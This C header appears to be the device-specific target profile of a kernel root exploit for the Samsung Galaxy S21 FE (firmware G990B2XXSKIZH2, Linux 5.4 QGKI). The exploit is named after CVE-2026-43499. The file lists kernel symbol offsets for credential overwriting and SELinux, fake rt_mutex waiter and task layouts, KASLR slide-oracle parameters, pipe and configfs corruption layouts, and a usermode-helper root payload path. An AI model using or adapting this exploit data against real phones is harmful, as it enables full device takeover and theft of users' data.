// SPDX-License-Identifier: GPL-2.0
//
// Target profile: Samsung SM-G990B2 (Galaxy S21 FE 5G)
// Firmware:       G990B2XXSKIZH2
// Android:        16 (BP2A.250605.031.A3)
// Kernel:         Linux 5.4.289-qgki-32192773-abG990B2XXSKIZH2 (Qualcomm SM8350 / QGKI)
// Build date:     Tue Aug 25 17:19:11 KST 2026
// Compiler:       Android clang 11.0.2 (r383902b1), LLD 11.0.2
//
// ELF base recovered by vmlinux-to-elf 1.3.6 from kallsyms:
//   KIMAGE_TEXT_BASE = 0xffffffc010080000 (_text symbol)
//   Relocations: 135704 entries verified
//   kallsyms: 191377 symbols
//
// All _OFF values are relative to KIMAGE_TEXT_BASE.
//
// Symbols resolved:
//   init_task, prepare_kernel_cred, commit_creds, override_creds,
//   root_task_group, selinux_enforcing, kmalloc_caches, anon_pipe_buf_ops,
//   system_unbound_wq, call_usermodehelper_exec_work (CFI-mangled),
//   ashmem_fops, ashmem_misc, ashmem_{ioctl,compat_ioctl,mmap,open,release,show_fdinfo},
//   configfs_read_file (= CONFIGFS_READ_ITER on 5.4), configfs_write_bin_file,
//   generic_file_splice_read, noop_llseek,
//   nfulnl_logger, random_table
//
// Struct layout notes (5.4 QGKI):
//   - LEGACY rt_mutex_waiter (two rb_node, no ww_ctx, no savestate)
//   - KMALLOC_CGROUP_TYPE=1 (CONFIG_MEMCG_KMEM=y -> 3 cache types)
//   - CONFIG_CONFIGFS_FS=y, CONFIG_ASHMEM=y, CONFIG_FUTEX_PI=y
//   - CONFIG_DEBUG_FS not set -> no tracefs slide
//   - No ARM64 MTE (Snapdragon 888 SM8350)
//   - CONFIG_RANDOMIZE_BASE=y (KASLR enabled, 32 candidate slides)
//
#ifndef OFFSET_H
#define OFFSET_H

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 960
#endif

#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

#define MM_ORDER 3
#define KSNITCH_COLLISIONS 5
#define KERNELSNITCH_VERBOSE 1
#define KERNELSNITCH_MTE_ENABLED 0
#define KERNELSNITCH_FUTEX_HASH_SIZE 0x800
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
#define KERNELSNITCH_THRESHOLD_MULT 6
#define FAKE_WAITER_PRIO 130
#define PSELECT_ENTER_DELAY_USEC 50000

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "r9q2-G990B2XXSKIZH2-app-configfs-pipe-root"
#define APP_PHYS_P0_ORACLE 1
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
#define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define APP_FOPS_ROUTE_FINE_DELAY_TICKS 0ULL
#define APP_FOPS_BEFORE_PIPE 1
#define APP_EXACT_PIPE_BUFFER_ONLY 1
#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
#define APP_ROOT_REF_HOLDER_REQUIRED 0
#define DEFAULT_EXPLOIT_ATTEMPTS 24 /* match preload supervisor attempts */
#else
#define BUILD_VARIANT_LABEL "r9q2-G990B2XXSKIZH2-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/r9q2xeea/r9q:16/BP2A.250605.031.A3/G990B2XXSKIZH2:user/release-keys"
#endif

// Kernel virtual layout (5.4 QGKI, SM8350)
#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL
#define P0_PAGE_OFFSET   0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET   0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
// ARM64 text_offset = 0x80000
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#endif

#define SKB_DATA_DELTA (-0x1000LL)   /* SM8350 5.4 QGKI: matches r12s (Galaxy S21 FE US) */
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 192          /* SM8350: matches r12s APP_SLIDE_RECLAIM_SENDS */
#define APP_SLIDE_RECLAIM_SENDS 192
#define APP_SLIDE_RECLAIM_SNDBUF 16777216 /* 16 MB: matches r12s */
#define PIPE_MAX_ATTEMPTS 20           /* increase to compensate for DMA32 skip failures */

// KASLR slide oracle — 32 slots of 64KB, probe at Image[0x1f0000 - slide]
#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#define SLIDE_WAIT_NSEC 2000000000L
#define SLIDE_REQUEUE_ARM_USEC 20000
#define SLIDE_USE_FAKE_TASK 1
// Legacy rt_mutex_waiter (5.4): two separate rb_node, no ww_ctx
#define LEGACY_RT_MUTEX_WAITER 1
#define COMPACT_RT_MUTEX_WAITER 0
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
// tracefs is unavailable on this device (CONFIG_DEBUG_FS not set).
// These symbols are still required for compilation of slide.c.
// The tracefs path will fail gracefully at open() and fall through
// to the configfs-only oracle (P0_ORACLE_GATE_SLOT / P0_ORACLE_PROBE_SLOT).
#define SLIDE_TRACEFS_EVENT_ID 109
// worker_thread+0xb4: return addr after 'bl schedule' @ 0xffffffc010325ccc
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x002a5cccULL
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define SLIDE_KSNITCH_APPENDED_FUTEXES 8192
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
// No tracefs (CONFIG_DEBUG_FS not set); use configfs slide only
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/r9q2-G990B2XXSKIZH2/p0_fingerprint.h"
#endif

// Identity map / vmemmap
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END  0xffffff9000000000ULL
#define VMEMMAP_START   0xfffffffe00000000ULL

#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END   0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END   KERNELSNITCH_IDENTITY_END

#define APPENDED_FUTEXES 4096
#define REPEAT_MEASUREMENT 32  /* fast-profile cap: 8× speedup for controlled_mm_leak */
#define AVERAGE 4              /* fast-profile cap: matches SLIDE_KSNITCH_AVERAGE/2 */
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 4        /* SM8350: fewer DMA32 slabs to skip vs Exynos */
#define S918_TRIGGER_SLABS 16          /* SM8350: lower trigger threshold */
#define S918_SKB_SENDS 512             /* SM8350: needs more SKB sends for reliable page leak */
#define S918_SKB_SNDBUF 16777216       /* 16 MB: larger send buffer for SM8350 */
#define S918_RECLAIM_SOCKET_PAIRS 64   /* more socket pairs for better reclaim coverage */

// task_struct credential offsets (5.4 QGKI arm64, same as 5.10 Qualcomm)
#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL

// ── Core kernel symbol offsets (from KIMAGE_TEXT_BASE) ──────────────────────
// All values computed from vmlinux.nm (vmlinux-to-elf 1.3.6, 191377 symbols)
// using: offset = nm_addr - 0xffffffc010080000

#define INIT_TASK_OFF                     0x02ce1e80ULL
#define PREPARE_KERNEL_CRED_OFF           0x002b1838ULL
#define COMMIT_CREDS_OFF                  0x002b12e4ULL
#define OVERRIDE_CREDS_OFF                0x002b1660ULL
#define ROOT_TASK_GROUP_OFF               0x03222448ULL
#define SELINUX_ENFORCING_OFF             0x033c9414ULL
#define KMALLOC_CACHES_OFF                0x02580e98ULL
#define ANON_PIPE_BUF_OPS_OFF             0x0241c538ULL
#define SYSTEM_UNBOUND_WQ_OFF             0x02befa48ULL
// CFI-mangled: call_usermodehelper_exec_work$69c67dc028e7ce7f580c02eb69a0e941
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x0029e0ccULL

// ── ashmem file operations ───────────────────────────────────────────────────
#define ASHMEM_FOPS_OFF           0x023f3c60ULL
#define ASHMEM_MISC_FOPS_OFF      0x02c729c8ULL
#define ASHMEM_IOCTL_OFF          0x00159e18ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x0015a738ULL
#define ASHMEM_MMAP_OFF           0x0015a78cULL
#define ASHMEM_OPEN_OFF           0x0015a930ULL
#define ASHMEM_RELEASE_OFF        0x0015a9a8ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x0015ab08ULL

// ── configfs file operations (5.4 names — CFI-mangled) ──────────────────────
// configfs_read_file$8deedd4ede62ee51185fbb0a8add7642  (= CONFIGFS_READ_ITER)
#define CONFIGFS_READ_ITER_OFF      0x0058c948ULL
// configfs_write_bin_file$8deedd4ede62ee51185fbb0a8add7642 (= CONFIGFS_BIN_WRITE_ITER)
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0058ce40ULL

// ── splice / seek ────────────────────────────────────────────────────────────
#define COPY_SPLICE_READ_OFF      0x0050cf10ULL
#define NOOP_LLSEEK_OFF           0x004c3488ULL

// ── Absolute address macros ───────────────────────────────────────────────────
#define ASHMEM_MISC_FOPS   (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS        (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL       (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP        (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN        (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE     (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER     (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ   (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK        (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ  (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

// ── KASLR slide oracle data (for nfulnl_logger slide detection) ──────────────
// SLIDE_NFULNL_LOGGER_NAME_OFF: "nfnetlink_log\0" string in .data
//   (only candidate in data section; confirmed by file-offset 0x210a4dc)
#define SLIDE_NFULNL_LOGGER_NAME_OFF       0x0210a4dcULL
// SLIDE_NFULNL_LOGGER_OBJECT_OFF: nfulnl_logger struct (nf_logger)
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF     0x02beac18ULL
// SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF: random_table (boot_id source)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02d51ba8ULL
#define SLIDE_INIT_TASK_OFF     INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
// sysctl_bootid @ 0xffffffc0134e3a29 (vmlinux.nm) - KIMAGE_TEXT_BASE
#define SLIDE_SYSCTL_BOOTID_OFF 0x03463a29ULL
#define SLIDE_INIT_TASK_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ── Page / exploit layout ────────────────────────────────────────────────────
#define LOCK_OFF    0x2210
#define W0_OFF      0x2350
#define FOPS_OFF    0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF   0x4440
#define LEFT_OFF    0x5550
#define FAKE_TASK_OFF 0x3200

// ── Legacy rt_mutex_waiter layout (5.4 QGKI) ────────────────────────────────
// struct rt_mutex_waiter { rb_node tree_entry[0x00]; rb_node pi_tree_entry[0x18];
//                          task_struct *task[0x30]; rt_mutex *lock[0x38];
//                          int prio[0x40]; u64 deadline[0x48]; }
// (No ww_ctx, no savestate in this 5.4 version)
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF          0x30
#define FAKE_WAITER_LOCK_OFF          0x38
#define FAKE_WAITER_WAKE_STATE_OFF    0x40
#define FAKE_WAITER_PRIO_OFF          0x44
#define FAKE_WAITER_DEADLINE_OFF      0x48
#define FAKE_WAITER_WW_CTX_OFF        0x50
#define FAKE_WAITER_LAYOUT_SIZE       0x58

// ── Fake task offsets (5.4 arm64 task_struct) ────────────────────────────────
#define FAKE_TASK_USAGE_OFF       0x38
#define FAKE_TASK_PRIO_OFF        0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_PI_LOCK_OFF     0x884
#define FAKE_TASK_PI_WAITERS_OFF  0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0

// ── configfs page layout ─────────────────────────────────────────────────────
#define CFG_PAGE_OFF          16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF    88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF   100

// ── workqueue internals ──────────────────────────────────────────────────────
#define WQ_DFL_PWQ_OFF    0xb0
#define PWQ_POOL_OFF      0x00
#define PWQ_WQ_OFF        0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF    0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF  0x34

#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

// ── struct page / slab layout ────────────────────────────────────────────────
#define STRUCT_PAGE_SIZE             0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF        0x18
#define STRUCT_PAGE_TYPE_OFF         0x30

// ── pipe_buffer layout ───────────────────────────────────────────────────────
#define PIPE_BUFFER_SLOTS   32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

// ── file_operations field offsets ────────────────────────────────────────────
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xc8
#define FOPS_SHOW_FDINFO_OFF  0xe0

#endif /* OFFSET_H */
